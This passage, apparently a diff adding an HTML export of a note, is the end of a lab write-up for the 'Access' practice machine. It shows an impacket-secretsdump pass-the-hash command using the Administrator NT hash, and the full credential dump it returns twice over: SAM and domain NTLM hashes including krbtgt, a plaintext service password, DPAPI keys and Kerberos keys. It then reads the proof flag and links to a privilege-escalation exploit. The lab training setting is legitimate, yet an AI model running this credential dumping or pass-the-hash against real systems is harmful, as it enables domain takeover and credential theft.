+ 0020   71 36 1B E3 D2 BA E7 AC  8C BD E9 D5 55 36 C0 07   q6..........U6..
+ 0030   99 5A 11 4A 24 E4 42 E3  4C 12 3F F5 1B D7 D5 8C   .Z.J$.B.L.?.....
+NL$KM:4ae2c6535d7702c9aea948237c5b46394a56023bcc38b8c092dd412c72f2634671361be3d2bae7ac8cbde9d55536c007995a114a24e442e34c123ff51bd7d58c
+[*] _SC_ApacheHTTPServer 
+(Unknown User):ServiceApache!!
+[*] Cleaning up...</code></pre></div>
+<p>Dump the hashes:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Access]
+&boxur;&boxh;$ sudo impacket-secretsdump access.offsec/Administrator@192.168.229.187 -hashes :85010ccdc73e309c2159bbc9d1ffdc16                   
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0xe9a15188a6ad2d20d26fe2bc984b369e
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:85010ccdc73e309c2159bbc9d1ffdc16:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+ACCESS\SERVER$:aes256-cts-hmac-sha1-96:cc6e5d2691d43b65cffc5416f5ee38cc12e6af9a8b845e6d8384a18670e57c38
+ACCESS\SERVER$:aes128-cts-hmac-sha1-96:4ef1ddd1d4f45ca40c95d7f1f6e3c523
+ACCESS\SERVER$:des-cbc-md5:91206ec16ee9c704
+ACCESS\SERVER$:plain_password_hex:0fffdd83370304fec455ff4f7cc839cc2050ab890faf34b5e9d71767f5344bef07555522abbfe48884b1f2fb4aec754ff1771cb8c0a21b02085fc3128ee8cd38987234c7ea73994ba56e48e073b7227be1dd07c677552fbe4ce19d8b4c3e549469954cf2138e961b74de161c52f89551994daba4adf218020830920255047540e5c3322489270375c970a3d2810b380923ff37e69d7b98ec20955fb59730e80d87664315f212868ca26f22aeb2bfbeecb3c0f3128e2c594ca457ee8365a4f942ae8804c40be21e5697c379c1ef6a647d9a17cc107f30b741cfbd82c28a04492d9c4f58e09a8c31d5fb765c7fb53fa79e
+ACCESS\SERVER$:aad3b435b51404eeaad3b435b51404ee:48dae21d2ff5d43ae8a6436a521e5e50:::
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0x3df657e4617398e4ab73e41c6183f8ac3d608523
+dpapi_userkey:0xc69b79bdce1e77b22043bbb5bd336c39d3965012
+[*] NL$KM 
+ 0000   4A E2 C6 53 5D 77 02 C9  AE A9 48 23 7C 5B 46 39   J..S]w....H#|[F9
+ 0010   4A 56 02 3B CC 38 B8 C0  92 DD 41 2C 72 F2 63 46   JV.;.8....A,r.cF
+ 0020   71 36 1B E3 D2 BA E7 AC  8C BD E9 D5 55 36 C0 07   q6..........U6..
+ 0030   99 5A 11 4A 24 E4 42 E3  4C 12 3F F5 1B D7 D5 8C   .Z.J$.B.L.?.....
+NL$KM:4ae2c6535d7702c9aea948237c5b46394a56023bcc38b8c092dd412c72f2634671361be3d2bae7ac8cbde9d55536c007995a114a24e442e34c123ff51bd7d58c
+[*] _SC_ApacheHTTPServer 
+ACCESS\svc_apache:ServiceApache!!
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:85010ccdc73e309c2159bbc9d1ffdc16:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:24e346a56bd63cab74d110e85d7c5c5e:::
+svc_apache:1103:aad3b435b51404eeaad3b435b51404ee:d8f8fd2f7c065ffa8b66aa1792e3d1cf:::
+svc_mssql:1104:aad3b435b51404eeaad3b435b51404ee:f773c5db7ddebefa4b0dae7ee8c50aea:::
+SERVER$:1000:aad3b435b51404eeaad3b435b51404ee:48dae21d2ff5d43ae8a6436a521e5e50:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:10e24acd9cdf678717cffe4f66bff5fd352f72f826173938182e074a6993a00e
+Administrator:aes128-cts-hmac-sha1-96:c93c3ab2a4d4f0be96b51d1328af251e
+Administrator:des-cbc-md5:e373a7a823a1b06e
+krbtgt:aes256-cts-hmac-sha1-96:163b0a36f742494e26fab29171026daeab3af132a1c3b58ff64cdc5a890a66d4
+krbtgt:aes128-cts-hmac-sha1-96:f1e1de9d95b8e67c0e48f38e8d40676b
+krbtgt:des-cbc-md5:3d01a2ad2af22ac1
+svc_apache:aes256-cts-hmac-sha1-96:7b2839f4f525256c7e1f67545da60dd5e39847885fe6786778906b107e179224
+svc_apache:aes128-cts-hmac-sha1-96:d41731eea422d428c98bd435b2b47217
+svc_apache:des-cbc-md5:86ef19490426921f
+svc_mssql:aes256-cts-hmac-sha1-96:61080145689ad0218fdb826bf90ecf82dbd78eb4ab935a696436061319666dab
+svc_mssql:aes128-cts-hmac-sha1-96:0e3969c49894b9e2d915553f90060095
+svc_mssql:des-cbc-md5:01cd707c86d992ad
+SERVER$:aes256-cts-hmac-sha1-96:cc6e5d2691d43b65cffc5416f5ee38cc12e6af9a8b845e6d8384a18670e57c38
+SERVER$:aes128-cts-hmac-sha1-96:4ef1ddd1d4f45ca40c95d7f1f6e3c523
+SERVER$:des-cbc-md5:57ef98858f26103e
+[*] Cleaning up...</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Access]
+&boxur;&boxh;$ sudo impacket-secretsdump access.offsec/Administrator@192.168.229.187 -hashes :85010ccdc73e309c2159bbc9d1ffdc16                   
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0xe9a15188a6ad2d20d26fe2bc984b369e
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:85010ccdc73e309c2159bbc9d1ffdc16:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+ACCESS\SERVER$:aes256-cts-hmac-sha1-96:cc6e5d2691d43b65cffc5416f5ee38cc12e6af9a8b845e6d8384a18670e57c38
+ACCESS\SERVER$:aes128-cts-hmac-sha1-96:4ef1ddd1d4f45ca40c95d7f1f6e3c523
+ACCESS\SERVER$:des-cbc-md5:91206ec16ee9c704
+ACCESS\SERVER$:plain_password_hex:0fffdd83370304fec455ff4f7cc839cc2050ab890faf34b5e9d71767f5344bef07555522abbfe48884b1f2fb4aec754ff1771cb8c0a21b02085fc3128ee8cd38987234c7ea73994ba56e48e073b7227be1dd07c677552fbe4ce19d8b4c3e549469954cf2138e961b74de161c52f89551994daba4adf218020830920255047540e5c3322489270375c970a3d2810b380923ff37e69d7b98ec20955fb59730e80d87664315f212868ca26f22aeb2bfbeecb3c0f3128e2c594ca457ee8365a4f942ae8804c40be21e5697c379c1ef6a647d9a17cc107f30b741cfbd82c28a04492d9c4f58e09a8c31d5fb765c7fb53fa79e
+ACCESS\SERVER$:aad3b435b51404eeaad3b435b51404ee:48dae21d2ff5d43ae8a6436a521e5e50:::
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0x3df657e4617398e4ab73e41c6183f8ac3d608523
+dpapi_userkey:0xc69b79bdce1e77b22043bbb5bd336c39d3965012
+[*] NL$KM 
+ 0000   4A E2 C6 53 5D 77 02 C9  AE A9 48 23 7C 5B 46 39   J..S]w....H#|[F9
+ 0010   4A 56 02 3B CC 38 B8 C0  92 DD 41 2C 72 F2 63 46   JV.;.8....A,r.cF
+ 0020   71 36 1B E3 D2 BA E7 AC  8C BD E9 D5 55 36 C0 07   q6..........U6..
+ 0030   99 5A 11 4A 24 E4 42 E3  4C 12 3F F5 1B D7 D5 8C   .Z.J$.B.L.?.....
+NL$KM:4ae2c6535d7702c9aea948237c5b46394a56023bcc38b8c092dd412c72f2634671361be3d2bae7ac8cbde9d55536c007995a114a24e442e34c123ff51bd7d58c
+[*] _SC_ApacheHTTPServer 
+ACCESS\svc_apache:ServiceApache!!
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:85010ccdc73e309c2159bbc9d1ffdc16:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:24e346a56bd63cab74d110e85d7c5c5e:::
+svc_apache:1103:aad3b435b51404eeaad3b435b51404ee:d8f8fd2f7c065ffa8b66aa1792e3d1cf:::
+svc_mssql:1104:aad3b435b51404eeaad3b435b51404ee:f773c5db7ddebefa4b0dae7ee8c50aea:::
+SERVER$:1000:aad3b435b51404eeaad3b435b51404ee:48dae21d2ff5d43ae8a6436a521e5e50:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:10e24acd9cdf678717cffe4f66bff5fd352f72f826173938182e074a6993a00e
+Administrator:aes128-cts-hmac-sha1-96:c93c3ab2a4d4f0be96b51d1328af251e
+Administrator:des-cbc-md5:e373a7a823a1b06e
+krbtgt:aes256-cts-hmac-sha1-96:163b0a36f742494e26fab29171026daeab3af132a1c3b58ff64cdc5a890a66d4
+krbtgt:aes128-cts-hmac-sha1-96:f1e1de9d95b8e67c0e48f38e8d40676b
+krbtgt:des-cbc-md5:3d01a2ad2af22ac1
+svc_apache:aes256-cts-hmac-sha1-96:7b2839f4f525256c7e1f67545da60dd5e39847885fe6786778906b107e179224
+svc_apache:aes128-cts-hmac-sha1-96:d41731eea422d428c98bd435b2b47217
+svc_apache:des-cbc-md5:86ef19490426921f
+svc_mssql:aes256-cts-hmac-sha1-96:61080145689ad0218fdb826bf90ecf82dbd78eb4ab935a696436061319666dab
+svc_mssql:aes128-cts-hmac-sha1-96:0e3969c49894b9e2d915553f90060095
+svc_mssql:des-cbc-md5:01cd707c86d992ad
+SERVER$:aes256-cts-hmac-sha1-96:cc6e5d2691d43b65cffc5416f5ee38cc12e6af9a8b845e6d8384a18670e57c38
+SERVER$:aes128-cts-hmac-sha1-96:4ef1ddd1d4f45ca40c95d7f1f6e3c523
+SERVER$:des-cbc-md5:57ef98858f26103e
+[*] Cleaning up...</code></pre></div>
+<p>The final flag:</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">C:\Windows\system32&gt;more C:\Users\Administrator\Desktop\proof.txt
+more C:\Users\Administrator\Desktop\proof.txt
+aa17fd9125c3c758ae30a2cd9c01e545
+
+C:\Windows\system32&gt;
+</pre><pre class="hljs"><code><span class="hljs-name">C</span>:\Windows\system32&gt;more <span class="hljs-name">C</span>:\Users\Administrator\Desktop\proof.txt
+more <span class="hljs-name">C</span>:\Users\Administrator\Desktop\proof.txt
+aa17fd9125c3c758ae30a2cd9c01e545
+
+<span class="hljs-name">C</span>:\Windows\system32&gt;
+</code></pre></div>
+<p>More on this attack is available <a data-from-md="" title="https://github.com/CsEnox/SeManageVolumeExploit" href="https://github.com/CsEnox/SeManageVolumeExploit">here</a></p>
+</div></div>
+					</body>
+				</html>
+			
